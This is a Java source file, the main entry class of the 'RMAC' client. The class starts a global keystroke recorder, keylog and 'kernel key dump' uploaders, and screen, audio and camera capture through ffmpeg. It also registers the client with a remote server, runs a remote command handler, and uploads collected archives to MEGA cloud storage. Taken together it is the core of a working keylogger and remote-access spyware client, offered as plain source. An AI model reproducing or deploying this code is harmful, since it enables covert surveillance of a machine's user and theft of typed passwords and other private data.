package com.rmac;

import com.rmac.core.Archiver;
import com.rmac.core.CommandHandler;
import com.rmac.core.Config;
import com.rmac.core.FileUploader;
import com.rmac.core.KernelDump;
import com.rmac.core.KeyLog;
import com.rmac.core.KeyRecorder;
import com.rmac.core.MegaClient;
import com.rmac.core.ScreenRecorder;
import com.rmac.core.ScriptFiles;
import com.rmac.core.Service;
import com.rmac.ipc.SocketServer;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Commands;
import com.rmac.utils.Constants;
import com.rmac.utils.FileSystem;
import com.rmac.utils.Utils;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileLock;
import java.nio.file.StandardCopyOption;
import java.util.Objects;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Main entry and exit point for RMAC client.
 * <br>
 * <br>
 * Performs following tasks in sequence.
 * <ol>
 *   <li>Verifies the runtime directory and its files (ffmpeg, megacmd, svcl, config, jre etc.)</li>
 *   <li>Tries to acquire a lock for this RMACClient instance to make sure only one instance is running</li>
 *   <li>Loads the configuration.</li>
 *   <li>Creates SocketServer to establish comms with RMACUpdater process.</li>
 *   <li>Initializes FileUploader process</li>
 *   <li>Initializes Archiver and uploads any pending archives from previous run in a threaded process.</li>
 *   <li>Generates script files</li>
 *   <li>Starts the KeyRecorder process</li>
 *   <li>Registers this RMACClient with the RMAC Server</li>
 *   <li>Starts the KeyLog upload process</li>
 *   <li>Starts the ScreenRecorder process</li>
 *   <li>Registers the shutdown hook</li>
 * </ol>
 */
public class RMAC {

  public static Logger log;

  // References for critical processes
  public static Config config;
  public static FileUploader uploader;
  public static ScriptFiles scriptFiles;
  public static CommandHandler commandHandler;
  public static ScreenRecorder screenRecorder;
  public static KeyLog keyLog;
  public static KeyRecorder keyRecorder;
  public static Archiver archiver;
  public static SocketServer ipcInterface;
  public static KernelDump kernelDumpsUploader;

  // Global flags
  public static boolean isClientRegistered = false;
  public static boolean SHUTDOWN = false;
  public static boolean NETWORK_STATE = false;
  public static boolean NATIVE_POSSIBLE = false;

  // References for acquiring an instance lock
  public static FileLock fileLock;
  public static RandomAccessFile randomAccessFile;

  public static FileSystem fs = new FileSystem();
  public static MegaClient mega = new MegaClient();
  public static Service service = new Service();

  public static void main(String[] args) throws InstantiationException, IllegalAccessException {
    new RMAC().start(args);
  }

  public void start(String[] args) throws InstantiationException, IllegalAccessException {
    if (!this.validateRuntimeDirectory(args)) {
      System.err.println("Runtime directory validation failed");
      System.exit(0);
    }

    // Set locations of all necessary files
    Constants.setRuntimeLocation(args[0]);

    if (!Constants.setCurrentLocation()) {
      System.err.println("Could not set current location");
      System.exit(0);
    }

    // Need to initialize logger here instead of doing it statically,
    // due to dependency of custom FileAppender on Config
    log = LoggerFactory.getLogger(RMAC.class);

    // Try acquiring a lock for this instance, if it fails then probably another instance is running
    if (!this.lockInstance(Constants.INSTANCE_LOCK_LOCATION)) {
      log.error("Failed to acquire instance lock, another instance is running");
      System.exit(0);
    } else {
      log.info("Instance lock acquired");
    }

    // Load config (from config.rmac)
    config = (Config) this.getInstance(Config.class);
    try {
      config.loadConfig();
    } catch (Exception e) {
      log.error("Could not load config file", e);
      System.exit(0);
    }

    // Copy RMAC Native DLL from jar to Runtime location
    NATIVE_POSSIBLE = this.copyDLL();
    // Create SocketServer and start listening for connection
    ipcInterface = (SocketServer) this.getInstance(SocketServer.class);
    ipcInterface.start();
    // Initialize FileUploader
    uploader = (FileUploader) this.getInstance(FileUploader.class);
    // Initialize Archiver
    archiver = (Archiver) this.getInstance(Archiver.class);
    new Thread(() -> RMAC.archiver.uploadArchive()).start();
    // Verify Script Files
    scriptFiles = (ScriptFiles) this.getInstance(ScriptFiles.class);
    // Initialize KL Output file
    keyLog = (KeyLog) this.getInstance(KeyLog.class);
    // Register JNativeHook
    keyRecorder = (KeyRecorder) this.getInstance(KeyRecorder.class);
    // Register this Client
    service.registerClient();
    // Initialize CommandHandler
    commandHandler = (CommandHandler) this.getInstance(CommandHandler.class);
    // Initialize Screen Recorder
    screenRecorder = (ScreenRecorder) this.getInstance(ScreenRecorder.class);
    // Initialize RMAC Kernel Key Dumps Uploader
    kernelDumpsUploader = (KernelDump) this.getInstance(KernelDump.class);

    log.info("RMAC client initialized successfully");

    this.addShutdownHook();
  }

  /**
   * Validate if important runtime files and configuration exists, create missing directories.
   * <br><br>
   * <cite>
   * Runtime directory contains config/programs that are crucial for RMAC client to function on host
   * machine.
   * <br>
   *   <ul>
   *     <li><b>/jre</b>: Directory containing Java runtime</li>
   *     <li><b>/megacmd</b>: Directory containing MEGA cli</li>
   *     <li><b>/config.rmac</b>: RMAC configuration file</li>
   *     <li><b>/ffmpeg.exe</b>: FFMPEG for screen/audio/camera capturing</li>
   *     <li><b>/nircmd.exe</b>: NirCMD for running utility commands on host machine</li>
   *     <li><b>/svcl.exe</b>: SoundVolume command-line tool for determining default input devices</li>
   *   </ul>
   * </cite>
   *
   * @param args program command-line arguments
   * @return validation result (true = success | false = failed)
   */
  public boolean validateRuntimeDirectory(String[] args) {
    if (args.length < 1) {
      System.err.println("Runtime location not provided as an argument");
      return false;
    }

    String runtimeDir = args[0];
    if (!fs.exists(runtimeDir)) {
      System.err.println("Provided runtime directory doesn't exist");
      return false;
    }

    // Validate if important executables and config exists
    if (!fs.exists(runtimeDir + "\\config.rmac") ||
        !fs.exists(runtimeDir + "\\ffmpeg.exe") ||
        !fs.exists(runtimeDir + "\\megacmd") ||
        !fs.exists(runtimeDir + "\\jre")
    ) {
      System.err.println("Runtime files or config missing in runtime directory");
      return false;
    }

    try {
      fs.createDirs(runtimeDir + "\\scripts");
    } catch (IOException e) {
      System.err.println("Could not create scripts directory");
      return false;
    }

    return true;
  }

  /**
   * Register JVM shutdown hook
   */
  public void addShutdownHook() {
    Runtime.getRuntime().addShutdownHook(new Thread(() -> {
      if (!SHUTDOWN) {
        initiateShutdown();
      }
    }));
  }

  /**
   * Shutdown running processes, cleanup and release instance lock.
   */
  public static void initiateShutdown() {
    SHUTDOWN = true;

    commandHandler.shutdown();
    screenRecorder.shutdown();
    keyLog.shutdown();

    log.warn("Shutting down JNH...");
    GlobalScreen.removeNativeKeyListener(KeyRecorder.nativeKeyListener);
    try {
      GlobalScreen.unregisterNativeHook();
    } catch (NativeHookException e) {
      log.error("Could not unregister JNH", e);
    }

    RMAC.archiver.cleanUp();
    log.info("Cleanup completed");

    try {
      Runtime.getRuntime().exec(Commands.C_MEGACMD_KILL);
    } catch (IOException e) {
      log.error("Could not kill megacmdserver process");
    }

    ((ch.qos.logback.classic.Logger)
        LoggerFactory.getLogger(org.slf4j.Logger.ROOT_LOGGER_NAME)
    ).getAppender("FILE").stop();

    String logFilePath = Constants.TEMP_LOCATION + "\\Log-" + Utils.getTimestamp() + ".txt";
    try {
      fs.move(Constants.LOG_LOCATION, logFilePath, StandardCopyOption.REPLACE_EXISTING);
      RMAC.archiver.moveToArchive(logFilePath, ArchiveFileType.OTHER);
    } catch (IOException ignored) {
    }

    try {
      RMAC.fileLock.release();
      RMAC.randomAccessFile.close();
      fs.delete(Constants.INSTANCE_LOCK_LOCATION);
      log.info("Instance lock released");
    } catch (Exception e) {
      log.error("Couldn't remove lock file: " + Constants.INSTANCE_LOCK_LOCATION, e);
    }
  }

  /**
   * Try acquiring a lock on a file.
   *
   * @param lockFile The file to acquire a lock on
   * @return Lock result (true = success | false = failed)
   */
  public boolean lockInstance(final String lockFile) {
    try {
      fs.create(lockFile);
      RMAC.randomAccessFile = fs.createRandomAccessFile(lockFile, "rw");
      RMAC.fileLock = RMAC.randomAccessFile.getChannel().tryLock();
      if (Objects.nonNull(RMAC.fileLock)) {
        return true;
      }
    } catch (Exception e) {
      log.error("Couldn't create/lock lock-file: " + lockFile, e);
    }
    return false;
  }

  /**
   * Extract RMAC native dll from JAR to runtime directory.
   *
   * @return Result (true = succeeded | false = failed)
   */
  public boolean copyDLL() {
    try (InputStream is = fs.getResourceAsStream(RMAC.class, "/rmac-native.dll")) {
      if (Objects.nonNull(is)) {
        fs.copy(is, Constants.RMAC_DLL_LOCATION, StandardCopyOption.REPLACE_EXISTING);
        return true;
      } else {
        log.error("Could not read RMAC dll from JAR");
      }
    } catch (IOException e) {
      log.warn(
          "Failed to copy RMAC dll from jar to Runtime, audio recording mode will be restricted to Active, ActiveAudioRecording=true config property will be ignored",
          e);
    }
    return false;
  }

  /**
   * Get a new instance for provided class type.
   *
   * @param clazz The class for which a new instance is to be created.
   * @return Class instance
   * @throws InstantiationException when class instantiation fails.
   * @throws IllegalAccessException when class instantiation fails.
   */
  public Object getInstance(Class<?> clazz) throws InstantiationException, IllegalAccessException {
    return clazz.newInstance();
  }
}
